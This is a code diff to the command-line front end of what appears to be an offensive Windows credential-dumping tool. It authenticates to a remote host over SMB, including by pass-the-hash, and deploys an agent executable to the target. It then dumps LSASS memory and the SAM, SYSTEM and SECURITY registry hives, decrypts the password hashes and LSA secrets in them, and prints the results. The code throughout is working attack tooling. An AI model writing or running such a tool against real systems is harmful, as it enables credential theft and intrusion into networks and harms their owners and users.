@@ -34,9 +34,9 @@ examples:
     dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
     dump_parser.add_argument(
         "-m", "--method",
-        choices=["auto", "registry", "pipe"],
+        choices=["auto", "registry"],
         default="auto",
-        help="Extraction method (default: auto = registry + pipe agent)",
+        help="Extraction scope (default: auto = registry + LSASS)",
     )
     dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected if omitted)")
     dump_parser.add_argument("--agent", default=None, metavar="PATH", help="Path to agent.exe")
@@ -71,8 +71,15 @@ examples:
 
 
 def _cmd_dump(args):
-    """Full credential extraction: registry + LSASS."""
+    """Deploy agent, extract registry hives + LSASS."""
     from .smb import SmbSession
+    from .dump.methods import PipeDump
+
+    agent_path = args.agent or os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
+    if not os.path.isfile(agent_path):
+        print(f"[!] Agent not found: {agent_path}")
+        print("    Build it with: cd agent && make cross")
+        sys.exit(1)
 
     print(f"[*] Connecting to {args.target}...")
 
@@ -82,39 +89,64 @@ def _cmd_dump(args):
             auth_method = "PTH" if args.nt_hash else "password"
             print(f"[+] Authenticated as {args.domain}\\{args.username} ({auth_method})")
 
-            do_registry = args.method in ("auto", "registry")
-            do_lsass = args.method in ("auto", "pipe")
+            method = PipeDump(session, agent_path)
 
-            if do_registry:
-                _dump_registry(session)
-
+            # Determine LSASS PID (0 = registry only)
+            do_lsass = args.method == "auto"
+            lsass_pid = 0
             if do_lsass:
-                _dump_lsass(session, args)
+                lsass_pid = args.pid or method.find_lsass_pid()
+                print(f"[*] Deploying agent (registry + LSASS pid={lsass_pid})")
+            else:
+                print("[*] Deploying agent (registry only)")
+
+            result = method.execute(lsass_pid=lsass_pid)
+
+            # Process registry hives
+            if result.system_hive and result.sam_hive:
+                _process_hives(result.system_hive, result.sam_hive, result.security_hive)
+
+            # Process LSASS dump
+            if result.lsass_dump:
+                print(f"\n[+] LSASS dump: {len(result.lsass_dump)} bytes ({len(result.lsass_dump) // 1024 // 1024} MB)")
+                if args.output:
+                    with open(args.output, "wb") as f:
+                        f.write(result.lsass_dump)
+                    print(f"[+] Saved to {args.output}")
+                _parse_and_display(result.lsass_dump)
+            elif do_lsass:
+                print("\n[-] No LSASS data received")
+
     except Exception as e:
-        print(f"[!] Connection failed: {e}")
+        print(f"[!] Failed: {e}")
         sys.exit(1)
 
 
-def _dump_registry(session):
-    """Extract secrets from remote registry."""
+def _process_hives(system_hive: bytes, sam_hive: bytes, security_hive: bytes):
+    """Parse and decrypt registry hives received from the agent."""
+    import struct
+    from .secrets.hivereader import RegistryHive
+    from .secrets.crypto import (
+        extract_boot_key, compute_hashed_boot_key, decrypt_sam_hash_aes,
+        decrypt_lsa_key, decrypt_lsa_secret,
+    )
     from .secrets.registry import RegistrySecrets
 
     print()
     print("── Registry Secrets ─────────────────────────────────────────")
-    reg_secrets = RegistrySecrets(session)
 
-    # Ensure service is running
     try:
-        reg_secrets.ensure_remote_registry()
-        print("[+] Remote Registry service ready")
+        sys_hive = RegistryHive(system_hive)
+        boot_key = RegistrySecrets._boot_key_from_hive_static(sys_hive)
     except Exception as e:
-        print(f"[!] Cannot start Remote Registry: {e}")
+        print(f"[!] Failed to parse SYSTEM hive: {e}")
         return
 
-    try:
-        # SAM hashes
+    # SAM hashes
+    if sam_hive:
         try:
-            hashes = reg_secrets.dump_sam()
+            reg = RegistrySecrets.__new__(RegistrySecrets)
+            hashes = reg._parse_sam_hive(sam_hive, boot_key)
             if hashes:
                 print(f"[+] SAM hashes ({len(hashes)}):")
                 for h in hashes:
@@ -124,9 +156,11 @@ def _dump_registry(session):
         except Exception as e:
             print(f"[!] SAM extraction failed: {e}")
 
-        # LSA Secrets
+    # LSA Secrets
+    if security_hive:
         try:
-            secrets = reg_secrets.dump_lsa_secrets()
+            reg = RegistrySecrets.__new__(RegistrySecrets)
+            secrets = reg._parse_security_hive(security_hive, boot_key)
             if secrets:
                 print(f"[+] LSA Secrets ({len(secrets)}):")
                 for s in secrets:
@@ -135,53 +169,6 @@ def _dump_registry(session):
                 print("[-] No LSA secrets found")
         except Exception as e:
             print(f"[!] LSA secrets failed: {e}")
-
-        # Cached creds
-        try:
-            cached = reg_secrets.dump_cached_creds()
-            if cached:
-                print(f"[+] Cached credentials ({len(cached)}):")
-                for c in cached:
-                    print(f"    {c.domain}\\{c.username}:{c.hash_hex}")
-            else:
-                print("[-] No cached credentials")
-        except Exception as e:
-            print(f"[!] Cached creds failed: {e}")
-    finally:
-        reg_secrets.cleanup_remote_registry()
-        print("[*] Remote Registry service restored")
-
-
-def _dump_lsass(session, args):
-    """Dump LSASS memory and extract credentials."""
-    from .dump.methods import PipeDump
-
-    print()
-    print("── LSASS Memory ─────────────────────────────────────────────")
-
-    agent_path = args.agent or os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
-    if not os.path.isfile(agent_path):
-        print(f"[!] Agent not found: {agent_path}")
-        print("    Build it with: cd agent && make cross")
-        return
-
-    method = PipeDump(session, agent_path)
-    print("[*] Method: pipe (agent uploaded to ADMIN$/Temp)")
-
-    try:
-        dump_data = method.execute(lsass_pid=args.pid)
-    except Exception as e:
-        print(f"[!] LSASS dump failed: {e}")
-        return
-
-    print(f"[+] Received {len(dump_data)} bytes ({len(dump_data) // 1024 // 1024} MB)")
-
-    if args.output:
-        with open(args.output, "wb") as f:
-            f.write(dump_data)
-        print(f"[+] Saved to {args.output}")
-
-    _parse_and_display(dump_data)
 
 
 def _cmd_parse(args):
